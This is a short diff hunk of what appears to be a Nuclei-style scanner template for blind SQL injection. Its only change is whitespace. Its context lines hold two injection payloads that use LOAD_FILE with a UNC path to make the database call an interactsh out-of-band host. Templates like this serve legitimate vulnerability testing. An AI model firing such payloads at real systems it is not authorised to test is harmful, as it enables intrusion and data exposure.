@@ -15,7 +15,7 @@ http:
       loadfile:
         - "1' AND LOAD_FILE('\\\\{{interactsh-url}}\\\\abc')--"
         - "1 UNION SELECT LOAD_FILE('\\\\{{interactsh-url}}\\\\')--"
-
+        
     fuzzing:
       - part: query
         mode: single
